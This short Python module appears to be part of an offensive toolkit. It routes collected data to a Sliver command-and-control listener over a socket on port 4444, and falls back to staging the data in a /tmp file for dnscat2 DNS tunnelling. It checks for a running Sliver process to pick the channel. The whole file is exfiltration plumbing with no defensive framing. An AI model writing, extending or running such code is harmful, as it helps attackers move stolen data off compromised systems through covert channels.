import json
import socket
import os

def send_sliver(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 4444))

        payload = json.dumps(data).encode()
        s.sendall(payload)

        s.close()
    except Exception as e:
        print(f"[!] Sliver send failed: {e}")

def send_dnscat2(data):
    try:
        with open("/tmp/dns_data.txt", "w") as f:
            f.write(json.dumps(data, indent=2))
    except Exception as e:
        print(f"[!] dnscat2 fallback failed: {e}")

def sliver_available():
    return os.system("pgrep sliver > /dev/null") == 0

def run(data, config):
    if sliver_available():
        send_sliver(data)
    else:
        send_dnscat2(data)
